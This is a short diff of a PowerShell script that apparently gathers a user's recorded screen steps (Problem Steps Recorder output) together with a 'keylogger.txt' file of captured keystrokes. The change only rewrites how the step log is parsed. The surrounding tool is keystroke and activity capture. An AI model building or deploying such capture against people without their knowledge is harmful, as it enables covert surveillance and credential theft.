@@ -1219,7 +1219,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         Expand-Archive (Get-ChildItem C:\temp\PSDocs\*.zip | Sort-Object LastWriteTime | Select-Object -last 1) $dir
         Start-Sleep -Milliseconds 250
         $PSRFile = (Get-ChildItem $dir\*.mht | Sort-Object LastWriteTime | Select-Object -last 1)
-        $PSRResult = (Get-Content $PSRFile | select-string "^        <p><b>") -replace '^        <p><b>', '' -replace '</b>', '' -replace '</p>', '' -replace '&quot;', "'"
+        $PSRParsing = (Get-Content $PSRFile | select-string "^        <p><b>") -replace '^        <p><b>', '' -replace '</b>', '' -replace '</p>', '' -replace '&quot;', "'" | Out-File "$dir\steps.txt"
+        $PSRResult = Get-Content "$dir\steps.txt"
 
         # Get Keylogger Results
         $KeyloggerResult = Get-Content "$dir\keylogger.txt"
